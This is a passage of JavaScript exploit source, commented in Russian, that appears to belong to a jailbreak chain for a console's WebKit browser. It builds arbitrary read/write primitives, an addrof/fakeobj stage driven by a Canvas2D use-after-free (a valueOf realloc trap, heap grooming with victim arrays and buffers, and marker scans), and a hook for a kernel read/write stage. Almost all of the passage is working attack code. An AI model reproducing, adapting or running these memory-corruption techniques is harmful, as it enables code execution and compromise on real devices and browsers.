        if (typeof a.malloc !== 'function') throw new JbNotReady('malloc: accessor has no malloc (VA unknown без leakval)');
        return KBAddr.of(a.malloc(size, align || 1));
      },
      leakval: function (obj) {
        var a = need('leakval');
        if (typeof a.leakval !== 'function') throw new JbNotReady('leakval: accessor has no leakval (addrof missing)');
        return KBAddr.of(a.leakval(obj));
      },
      read1: function (addr) { return readBytes(addr, 1)[0]; },
      read2: function (addr) { var b = readBytes(addr, 2); return (b[0] | (b[1] << 8)) >>> 0; },
      read4: function (addr) { var b = readBytes(addr, 4); return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0; },
      read8: function (addr) {
        var b = readBytes(addr, 8);
        return new KBAddr((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,
          (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0);
      },
      write1: function (addr, v) { writeBytes(addr, [v & 0xff]); },
      write2: function (addr, v) { writeBytes(addr, [v & 0xff, (v >>> 8) & 0xff]); },
      write4: function (addr, v) { writeBytes(addr, [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]); },
      write8: function (addr, v) {
        var x = KBAddr.of(v);
        writeBytes(addr, [x.low & 0xff, (x.low >>> 8) & 0xff, (x.low >>> 16) & 0xff, (x.low >>> 24) & 0xff,
          x.hi & 0xff, (x.hi >>> 8) & 0xff, (x.hi >>> 16) & 0xff, (x.hi >>> 24) & 0xff]);
      },

      // --- опциональные (kernel использует, если есть) ---
      attachKernelPipe: async function (kx) {
        if (typeof st.rwProvider === 'function') {
          var rw = await st.rwProvider(kx);
          if (rw && typeof rw.read === 'function' && typeof rw.write === 'function') {
            st.pipe = { read: rw.read, write: rw.write };
            p.pipeRead = function (addr, len, out) { return rw.read(KBAddr.of(addr), len, out); };
            p.pipeWrite = function (addr, val, len) { return rw.write(KBAddr.of(addr), val, len); };
            log('primitive: external kernel R/W provider attached for kernel stage');
            return rw;
          }
        }
        log('primitive: no external kernel R/W (внутренний AIO-путь модуля); STAGE 4 может уйти в BLOCKED');
        return null;
      },

      // --- контракт лида: адресные методы ---
      read64: function (addr) { return p.read8(addr).hex(); },
      write64: function (addr, v) { p.write8(addr, v); },
      read32: function (addr, off) { return p.read4(KBAddr.of(addr).add32(off || 0)); },
      write32: function (addr, off, v) { p.write4(KBAddr.of(addr).add32(off || 0), v); },
      add: function (addr, off) { return KBAddr.of(addr).add32(off || 0); },

      // --- typed Canvas2D канал (не требует leak; нужен alias) ---
      readDouble: function (name) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('readDouble: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.readPropFrom('stale', name);
      },
      writeDouble: function (name, v) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('writeDouble: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.writePropTo('stale', name, v);
      },
      readMatrix: function () {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('readMatrix: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.readTransformFrom('stale');
      },
      writeMatrix: function (m) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('writeMatrix: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.writeTransformTo('stale', m);
      },
      describe: function () {
        return {
          ready: p.ready(), reason: p.reason(), userlandAccessor: !!st.accessor,
          kernelPipe: !!st.pipe, canvas: canvasPrim ? canvasPrim.describe() : null,
          rawReady: !!(rawMem && rawMem.ready && rawMem.ready())
        };
      }
    };

    function readBytes(addr, n) {
      if (st.accessor) {
        var b = st.accessor.read(KBAddr.of(addr), n);
        return Array.prototype.slice.call(b || [], 0, n);
      }
      if (rawMem && rawMem.ready && rawMem.ready()) return bytesFromRaw(addr, n);
      throw new JbNotReady('read' + n * 8 + ' требует userland-доступ (leak/addrof): ' + p.reason());
    }
    function writeBytes(addr, bytes) {
      if (st.accessor) { st.accessor.write(KBAddr.of(addr), bytes); return; }
      if (rawMem && rawMem.ready && rawMem.ready()) { writeBytesRaw(addr, bytes); return; }
      throw new JbNotReady('write требует userland-доступ (leak/addrof): ' + p.reason());
    }

    // Если RawMemory уже готов (leak + forge) — сразу строим accessor поверх него.
    if (rawMem && rawMem.ready && rawMem.ready()) {
      p.attachUserlandAccessor({
        read: function (addr, n) { return bytesFromRaw(addr, n); },
        write: function (addr, bytes) { writeBytesRaw(addr, bytes); },
        malloc: null, leakval: null
      });
    }
    return p;
  }


  // =====================================================================================
  // STAGE 9b: addrof/fakeobj через пост-фри заготовку (без утечки адреса).
  //
  // Идея (лид): 1) освободить state-буфер через UAF; 2) записать туда «заготовку» —
  // 104 контролируемых байта (7 numeric props + transform matrix); 3) сразу выделить
  // объект-жертву (JSArray с butterfly / ArrayBuffer) того же size-class, чтобы
  // аллокатор положил его в этот слот; 4) у жертвы поля уже наши → поддельная длина/
  // указатель → произвольное чтение (read64/write64 через fake ArrayBuffer).
  // Никакой утечки адреса на первом шаге не нужно; адреса появляются из самого
  // переиспользования памяти.
  //
  // Что реализовано здесь:
  //   * layoutReport()      — измеренная/исходная раскладка контролируемых байт и
  //                           размеры кандидатов (JSArray/ArrayBuffer/State/ctx);
  //   * postFreeWriteAttempt() — полная последовательность на консоли: grow state stack
  //                           (8 save -> capacity 11 -> буфер 11*400=4400, класс ~4608),
  //                           realloc-trap (free под ссылкой), запись заготовки,
  //                           серия аллокаций жертв, скан маркеров, лог что/где сработало;
  //   * addrof(obj)/fakeobj(addr)/read64(addr)/write64(addr) — реализация поверх
  //                           «памяти» (backend). На консоли backend появляется после
  //                           успешного postFreeWriteAttempt (подделанный ArrayBuffer);
  //                           в Node — симулируется (js/addrof-selftest.js).
  // =====================================================================================

  // Раскладка State (источники: WebKit-7617 CanvasRenderingContext2DBase.h, struct State
  // ac708f98; измеренные константы 14.10/14.20: sizeof(State)=400 (v923), lineWidth=+0x30).
  var STATE_LAYOUT = [
    { prop: 'lineWidth',       field: 'm_lineWidth',        offset: 0x30, size: 8, status: 'MEASURED (v923: 37*400=14800, 32*400+48)' },
    { prop: 'miterLimit',      field: 'm_miterLimit',       offset: null, size: 8, status: 'SOURCE order (7597-патч): miterLimit после lineJoin; offset не измерен' },
    { prop: 'globalAlpha',     field: 'm_globalAlpha',      offset: null, size: 8, status: 'SOURCE order (ac708f98); offset не измерен' },
    { prop: 'shadowBlur',      field: 'm_shadowBlur',       offset: null, size: 4, status: 'float (SOURCE order)' },
    { prop: 'shadowOffsetX/Y',  field: 'm_shadowOffset',    offset: null, size: 8, status: 'FloatSize (SOURCE order)' },
    { prop: 'lineDashOffset',  field: 'm_lineDashOffset',   offset: null, size: 8, status: 'SOURCE order; lineDash Vector рядом (main: +0xF8 по adjudication)' },
    { prop: 'transform',       field: 'm_transform',        offset: 0x70, size: 48, status: 'SOURCE/ADJ: AffineTransform = 6 doubles (main drop: State+0x70); 7617 offset не измерен' }
  ];

  // Кандидаты-жертвы и их расчётные размеры (из исходников JavaScriptCore/WebCore).
  function victimCandidates() {
    var out = [];
    // JSCell = 8 (structureID 4 + indexingType/misc 1 + type 1 + flags 1 + cellState 1)
    var JSCELL = 8, JS_OBJECT_WITH_BUTTERFLY = 16;
    // Butterfly = IndexingHeader(8) + elements*8
    [8, 12, 16, 20, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 256, 320,
      384, 448, 512, 640, 768, 1024, 1536, 2048, 3072, 4096, 4608, 5120, 6400, 7424].forEach(function (bytes) {
      var elems = Math.max(1, Math.floor((bytes - 8) / 8));
      out.push({ kind: 'JSArray butterfly', allocBytes: 8 + elems * 8, cells: elems,
        reclaimSlot: bytes >= 768, note: 'elements в буттерфляе; после пост-фри записи можно вписать double в элементы' });
    });
    out.push({ kind: 'JSArray (object header)', allocBytes: JS_OBJECT_WITH_BUTTERFLY,
      cells: 2, reclaimSlot: false, note: 'JSCell(8)+butterfly ptr(8); объект маленький, в слот state-буфера не ляжет' });
    out.push({ kind: 'JSArrayBuffer (object)', allocBytes: 0x70,
      cells: 14, reclaimSlot: false, note: 'JSObject+ArrayBufferContents: m_data/m_size/m_maxByteLength/flags; маленький класс' });
    out.push({ kind: 'ArrayBuffer backing store', allocBytes: 'N (запрошенный)',
      cells: 'N/8', reclaimSlot: true, note: 'данные AB; можно занять слот 768/4608, но это не заголовок объекта' });
    out.push({ kind: 'CanvasRenderingContext2D', allocBytes: 768,
      cells: 96, reclaimSlot: true, note: 'публично 768B FastMalloc (IsoHeap OFF на PLAYSTATION)' });
    out.push({ kind: 'Canvas State', allocBytes: 400,
      cells: 50, reclaimSlot: false, note: 'sizeof(State)=400 (v923); inline State[0] в ctx' });
    out.push({ kind: 'Canvas state out-of-line buffer', allocBytes: 'capacity*400',
      cells: 'capacity*50', reclaimSlot: true, note: 'capacity 11 -> 4400 -> bmalloc class ~4608/5120 (8 save)' });
    out.push({ kind: 'CSSFontFace', allocBytes: 192,
      cells: 24, reclaimSlot: false, note: 'bitfit 192 (p640): тоже reclaim-класс, но не наш слот' });
    return out;
  }

  function TypeConfusionPrimitive(canvasPrim, log) {
    this.canvas = canvasPrim;
    this.log = log || function () {};
    this.backend = null;          // {read(addr,n)->bytes, write(addr,bytes), addrof(obj), fakeobj(addr)}
    this.simulated = [];          // SIM: объекты, положенные в память (для addrof/fakeobj в Node)
    this.hit = null;              // результат postFreeWriteAttempt
  }

  TypeConfusionPrimitive.prototype.layoutReport = function () {
    return {
      controlled: {
        numericProps: 7 * 8,
        transform: 6 * 8,
        totalBytes: 7 * 8 + 6 * 8,
        note: 'не непрерывный блок: поля State по смещениям из STATE_LAYOUT; средства записи — только публичный Canvas2D API'
      },
      stateLayout: STATE_LAYOUT,
      stateSize: 400,
      outOfLineCapacityLaw: [1, 2, 3, 4, 6, 8, 11],
      outOfLineBufferBytes: 11 * 400,
      canvasContextBytes: 768,
      victims: victimCandidates()
    };
  };

  // --- backend (на консоли: подделанный ArrayBuffer; в Node: симуляция) ---
  TypeConfusionPrimitive.prototype.attachBackend = function (backend) {
    this.backend = backend || null;
    this.log('primitive9b: memory backend ' + (backend ? 'attached (' + Object.keys(backend).join(',') + ')' : 'cleared'));
    return this;
  };
  TypeConfusionPrimitive.prototype.ready = function () { return !!this.backend; };

  // SIM: положить объект в симулированную память и получить его "адрес"
  TypeConfusionPrimitive.prototype._simAlloc = function (obj, size) {
    if (!this.backend || typeof this.backend.alloc !== 'function') throw new JbNotReady('addrof/fakeobj: нужен backend.alloc (SIM) или реальный подделанный ArrayBuffer');
    var addr = this.backend.alloc(size || 8);
    this.simulated.push({ obj: obj, addr: addr });
    return addr;
  };

  // addrof(obj): адрес JS-объекта (как double/hex). На консоли реализуется классическим
  // fakeobj-сканом: после postFreeWriteAttempt в слоте появляется массив, в элементах
  // которого лежат NaN-boxed значения объектов; читаем их через поддельный ArrayBuffer и
  // вычитаем тег. В Node backend даёт готовый адрес.
  TypeConfusionPrimitive.prototype.addrof = function (obj) {
    var b = this.backend;
    if (!b) throw new JbNotReady('addrof: нет memory backend (нужен успешный STAGE 9b post-free reclaim или SIM-симуляция)');
    if (typeof b.addrof === 'function') return b.addrof(obj);
    // классический путь: ищем объект в подготовленной памяти по тегу JSC
    for (var i = 0; i < this.simulated.length; i++) {
      if (this.simulated[i].obj === obj) return this.simulated[i].addr;
    }
    throw new JbNotReady('addrof: объект не найден в подготовленной памяти (нужен fakeobj-скан в постреальное время)');
  };

  // fakeobj(addr): JS-объект, чьи поля лежат по адресу addr (через поддельный ArrayBuffer).
  TypeConfusionPrimitive.prototype.fakeobj = function (addr) {
    var b = this.backend;
    if (!b) throw new JbNotReady('fakeobj: нет memory backend (STAGE 9b не дал поддельный ArrayBuffer; на ПК — SIM)');
    if (typeof b.fakeobj === 'function') return b.fakeobj(addr);
    return { __fakeObject: true, addr: addr, read64: this.read64.bind(this), write64: this.write64.bind(this) };
  };

  // read64(addr): 8 байт через fake ArrayBuffer (DataView поверх подделанного буфера).
  // read64/write64: 8 байт little-endian (как в памяти x86-64/FreeBSD).
  // Возвращают/принимают 64-битное значение hex-строкой '0x....'.
  TypeConfusionPrimitive.prototype.read64 = function (addr) {
    var b = this.backend;
    if (!b) throw new JbNotReady('read64: нет memory backend (нужен поддельный ArrayBuffer из STAGE 9b)');
    var bytes = b.read(addr, 8);
    var v = 0n;
    for (var i = 7; i >= 0; i--) v = (v << 8n) | BigInt(bytes[i] & 0xff);
    var hex = v.toString(16);
    while (hex.length < 16) hex = '0' + hex;
    return '0x' + hex;
  };
  TypeConfusionPrimitive.prototype.write64 = function (addr, val) {
    var b = this.backend;
    if (!b) throw new JbNotReady('write64: нет memory backend');
    var m = /^0x([0-9a-fA-F]{1,16})$/.exec(String(val));
    if (!m) throw new Error('write64: bad hex ' + val);
    var v = BigInt('0x' + m[1]);
    var bytes = [];
    for (var i = 0; i < 8; i++) bytes.push(Number((v >> BigInt(8 * i)) & 0xffn));
    b.write(addr, bytes);
    return true;
  };

  /**
   * Полная консольная последовательность пост-фри заготовки и свипа жертв.
   * Возвращает {status:'OK'|'FAIL'|'BLOCKED', attempts:[...], hit:{...}|null}.
   */
  TypeConfusionPrimitive.prototype.postFreeWriteAttempt = function () {
    var prim = this.canvas;
    var attempts = [];
    if (!prim || prim.aliasIdx < 0 || !prim.inner) {
      return { status: 'BLOCKED', reason: 'STAGE 9b: нужен alias (STAGE 2-4), сейчас alias отсутствует',
        attempts: attempts, layout: this.layoutReport() };
    }
    // 1) вырастить out-of-line state stack: 8 save при не-default lineWidth -> capacity 11
    var saves = 0;
    try {
      for (var i = 0; i < 8; i++) {
        prim.writePropTo('stale', 'lineWidth', 2.0 + i * 0.25);
        prim.inner.save(); saves++;
      }
      attempts.push({ step: 'grow-state-stack', ok: true, saves: saves, capacity: 11, bufferBytes: 11 * 400 });
    } catch (e) {
      attempts.push({ step: 'grow-state-stack', ok: false, err: String(e) });
    }
    // 2) realloc-trap: попытка освободить буфер под ссылкой (p555/p558-класс).
    var trapFired = 0;
    try {
      var trap = { valueOf: function () { trapFired++; for (var k = 0; k < 8; k++) prim.inner.save(); return 42.5; } };
      prim.inner.lineWidth = trap;            // конверсия -> realloc, затем setter пишет State
      attempts.push({ step: 'realloc-trap', ok: true, fired: trapFired });
    } catch (e) {
      attempts.push({ step: 'realloc-trap', ok: false, err: String(e) });
    }
    // 3) записать заготовку: по каждому prop — маркер, который потом ищем в жертвах
    var MARK = [12345.5, 23456.5, 34567.5, 45678.5, 56789.5, 67890.5, 78901.5];
    var written = [];
    var propNames = ['lineWidth', 'globalAlpha', 'shadowBlur', 'shadowOffsetX', 'shadowOffsetY', 'miterLimit', 'lineDashOffset'];
    try {
      for (var pidx = 0; pidx < propNames.length; pidx++) {
        prim.writePropTo('stale', propNames[pidx], MARK[pidx]);
        written.push({ prop: propNames[pidx], value: MARK[pidx] });
      }
      // transform отдельным каналом (6 doubles)
      prim.writeTransformTo('stale', [111.125, 222.25, 333.375, 444.5, 555.625, 666.75]);
      written.push({ prop: 'transform', value: [111.125, 222.25, 333.375, 444.5, 555.625, 666.75] });
      attempts.push({ step: 'write-preparation', ok: true, bytes: 104, written: written });
    } catch (e) {
      attempts.push({ step: 'write-preparation', ok: false, err: String(e) });
    }
    // 4) серия аллокаций жертв: ArrayBuffer и JSArray разных размеров
    var sizes = [96, 128, 192, 256, 384, 512, 768, 1024, 2048, 3072, 4096, 4608, 5120, 6400];
    var buffers = [], arrays = [], hits = [];
    try {
      sizes.forEach(function (sz) { buffers.push({ size: sz, ab: new ArrayBuffer(sz) }); });
      sizes.forEach(function (sz) {
        var n = Math.max(1, Math.floor((sz - 8) / 8));
        var arr = new Array(n);
        for (var q = 0; q < n; q++) arr[q] = 111.25;   // sentinel
        arrays.push({ size: sz, arr: arr, n: n });
      });
      attempts.push({ step: 'allocate-victims', ok: true, buffers: buffers.length, arrays: arrays.length, sizes: sizes });
    } catch (e) {
      attempts.push({ step: 'allocate-victims', ok: false, err: String(e) });
    }
    // 5) скан жертв: где появились наши маркеры?
    var allMarks = MARK.concat([111.125, 222.25, 333.375, 444.5, 555.625, 666.75]);
    try {
      arrays.forEach(function (v, ai) {
        for (var q = 0; q < v.arr.length; q++) {
          var val = v.arr[q];
          for (var m = 0; m < allMarks.length; m++) {
            if (typeof val === 'number' && Math.abs(val - allMarks[m]) < 1e-9) {
              hits.push({ kind: 'JSArray', sizeClass: v.size, index: q, value: val,
                elementOffset: 8 + q * 8, markIndex: m });
              return;
            }
          }
        }
      });
      buffers.forEach(function (v, bi) {
        var dv = new DataView(v.ab);
        for (var off = 0; off + 8 <= Math.min(v.size, 256); off += 8) {
          var d = dv.getFloat64(off, true);
          for (var m = 0; m < allMarks.length; m++) {
            if (Math.abs(d - allMarks[m]) < 1e-9) {
              hits.push({ kind: 'ArrayBuffer', sizeClass: v.size, offset: off, value: d, markIndex: m });
              return;
            }
          }
        }
      });
      attempts.push({ step: 'scan-victims', ok: true, hits: hits.length });
    } catch (e) {
      attempts.push({ step: 'scan-victims', ok: false, err: String(e) });
    }
    this.hit = hits.length ? hits[0] : null;
    return {
      status: hits.length ? 'OK' : 'FAIL',
      reason: hits.length ? 'post-free подготовка легла в жертву: ' + JSON.stringify(hits[0])
        : 'ни один из ' + (buffers.length + arrays.length) + ' кандидатов не показал наших маркеров: другой size-class/realloc не сработал',
      attempts: attempts, hits: hits, layout: this.layoutReport(),
      next: hits.length ? 'подделать поля жертвы (length/byteLength) и перейти к read64/write64 через fake ArrayBuffer'
        : 'подобрать другой size-class: capacity 11*400 -> 4608; попробовать capacity 8 (8*400=3200->class 3200/3584) и 12+'
    };
  };

  // Метод на самом примитиве: canvasPrim.toKernelP(rawMem)
  CanvasAliasPrimitive.prototype.toKernelP = function (rawMem) {
    return createKernelP(this, rawMem, this.log);
  };

  global.JBPrimitive = {
    CFG: CFG,
    JbNotReady: JbNotReady,
    KBAddr: KBAddr,
    createKernelP: createKernelP,
    STATE_LAYOUT: STATE_LAYOUT,
    victimCandidates: victimCandidates,
    TypeConfusionPrimitive: TypeConfusionPrimitive,
    CanvasAliasPrimitive: CanvasAliasPrimitive,
    RawMemory: RawMemory,
    makePrimitiveInterface: makePrimitiveInterface
  };
})(typeof window !== 'undefined' ? window : globalThis);